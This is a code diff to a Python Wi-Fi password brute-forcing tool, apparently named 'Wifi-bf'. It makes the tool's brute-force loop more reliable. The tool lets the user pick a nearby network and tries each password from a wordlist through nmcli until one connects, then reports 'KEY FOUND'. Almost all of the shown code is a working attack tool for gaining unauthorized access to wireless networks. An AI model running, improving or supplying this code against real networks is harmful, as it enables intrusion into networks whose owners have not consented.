@@ -124,10 +124,9 @@ def get_local_passwords():
 
 
 def require_root():
-    r = os.popen("whoami").read()
-    if (r.strip() != "root"):
-        print("Run it as root.")
-        sys.exit(-1)
+    if os.geteuid() != 0:
+        print("Run as root.")
+        sys.exit(1)
 
 
 """
@@ -178,69 +177,40 @@ def prompt_for_target_choice(max):
 """
 
 
-def brute_force(selected_network, passwords, args):
+def brute_force(selected_network, security, passwords, args):
     for password in passwords:
-        # necessary due to NetworkManager restart after unsuccessful attempt at login
         password = password.strip()
 
-        # when when obtain password from url we need the decode utf-8 however we doesnt when reading from file
         if isinstance(password, str):
             decoded_line = password
         else:
             decoded_line = password.decode("utf-8")
             
-        if args.verbose is True:
-            print(bcolors.HEADER+"** TESTING **: with password '" +
-                decoded_line+"'"+bcolors.ENDC)
+        if args.verbose:
+            print(bcolors.HEADER + "** TESTING **: with password '" + decoded_line + "'" + bcolors.ENDC)
 
-        if (len(decoded_line) >= 8):
-            contain = False
+        if len(decoded_line) >= 8:
+            # Delete any existing connection for the network to avoid key-mgmt issues
+            subprocess.run(["nmcli", "con", "delete", selected_network], capture_output=True)
+            time.sleep(0.5)
             
-            while contain == False:
-                available = os.popen("nmcli -f SSID dev wifi").read()
-                available = available.split('\n')
-                available = [item.strip() for item in available]
+            result = subprocess.run([
+                "nmcli", "dev", "wifi", "connect", selected_network, "password", decoded_line
+            ], capture_output=True, text=True)
             
-                if selected_network in available:
-                    contain = True
-                else:
-                    time.sleep(1)
-            
-            commands = [
-                "sudo",
-                "nmcli",
-                "dev",
-                "wifi",
-                "connect",
-                selected_network,
-                "password",
-                decoded_line,
-            ]
-            
-            try:
-                output = subprocess.run(commands, capture_output=True, text=True, 
-                    check=True)
-                if "error" in output.stdout.lower():
-                    if args.verbose is True:
-                        print(bcolors.FAIL+"** TESTING **: password '" +
-                            decoded_line+"' failed."+bcolors.ENDC)
-                        print(f"{bcolors.VERBOSEGRAY}{output.stdout}{bcolors.ENDC}")
-                elif "successfull" in output.stdout.lower():
-                    sys.exit(bcolors.OKGREEN+"** KEY FOUND! **: password '" +
-                        decoded_line+"' succeeded."+bcolors.ENDC)
-                else:
-                    print(f"Unknown output: {output.stdout}")
-            except subprocess.CalledProcessError:
-                if args.verbose is True:
-                    print(bcolors.FAIL+"** TESTING **: password '" +
-                        decoded_line+"' failed."+bcolors.ENDC)
-
+            if result.returncode == 0:
+                print(bcolors.OKGREEN + "** KEY FOUND! **: password '" + decoded_line + "' succeeded." + bcolors.ENDC)
+                sys.exit(0)
+            else:
+                if args.verbose:
+                    print(bcolors.FAIL + "** FAILED **: password '" + decoded_line + "' failed." + bcolors.ENDC)
+                    if result.stderr:
+                        print(bcolors.VERBOSEGRAY + "Reason: " + result.stderr.strip() + bcolors.ENDC)
         else:
-            if args.verbose is True:
-                print(bcolors.OKCYAN+"** TESTING **: password '" +
-                    decoded_line+"' too short, passing."+bcolors.ENDC)
+            if args.verbose:
+                print(bcolors.OKCYAN + "** TESTING **: password '" + decoded_line + "' too short, passing." + bcolors.ENDC)
 
-    print(bcolors.FAIL+"** RESULTS **: All passwords failed :("+bcolors.ENDC)
+    print(bcolors.FAIL + "** RESULTS **: All passwords failed :(" + bcolors.ENDC)
 
 
 """
@@ -291,13 +261,14 @@ def main():
     max = len(networks)
     pick = prompt_for_target_choice(max)
     target = networks[pick]
+    target_security = security_type[pick]
     
     cls()
     header()
     
     print("\nWifi-bf is running. If you would like to see passwords being tested in realtime, enable the [--verbose] flag at start.")
 
-    brute_force(target, passwords, args)
+    brute_force(target, target_security, passwords, args)
 
 
 main()
